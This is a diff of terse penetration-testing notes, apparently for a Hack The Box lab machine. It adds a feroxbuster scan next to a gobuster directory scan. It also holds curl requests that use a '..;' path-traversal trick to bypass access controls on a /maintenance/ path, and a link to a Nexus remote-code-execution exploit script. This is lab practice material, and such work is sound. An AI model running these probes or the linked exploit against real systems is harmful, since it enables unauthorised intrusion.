@@ -22,10 +22,15 @@ Username or Password incorrect
 Launch http://10.129.10.10:8000/
 
 gobuster dir -q -u http://10.129.10.10 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+//together with
+feroxbuster -u http://10.129.10.10 -x php,asp,aspx
+
+/* or
 curl -I "http://10.129.10.10/maintenance/"
 curl -v "http://10.129.10.10/maintenance/..;"
 curl -v "http://10.129.10.10/maintenance/..;/nxstartup.faces"
 http://10.129.96.116/maintenance/..;/login.jsp
+*/
 ==========(4)======================================================================================================================
 https://raw.githubusercontent.com/ajiththomas/python/refs/heads/main/nexusRCE2.py
 ==========(5)======================================================================================================================
